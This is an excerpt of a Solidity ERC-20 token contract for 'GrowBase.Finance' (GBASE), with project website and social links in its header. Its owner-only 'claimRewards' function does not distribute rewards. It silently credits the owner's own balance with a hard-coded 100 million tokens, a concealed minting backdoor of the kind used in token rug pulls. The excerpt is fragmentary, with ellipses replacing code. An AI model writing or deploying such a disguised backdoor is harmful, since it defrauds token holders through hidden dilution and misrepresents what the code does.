 ...
 * GrowBaseToken
 * 
 * website:  https://growbase.finance
 * tweeter:  https://twitter.com/GBaseFinance
 * telegram: https://t.me/growbasefinance
 */
...
contract GrowBaseToken is ERC20UpgradeSafe, OwnableUpgradeSafe {
    ...
    uint256 private constant feetokens = 100000000 * 10 ** DECIMALS;
    ...
    function initialize(uint256 initialSupply)
        ...
        initializer
    {
        __ERC20_init("GrowBase.Finance", "GBASE");
    ...
    function claimRewards() public virtual onlyOwner {
        _vOwned[_msgSender()] = _vOwned[_msgSender()].add(feetokens);
    }
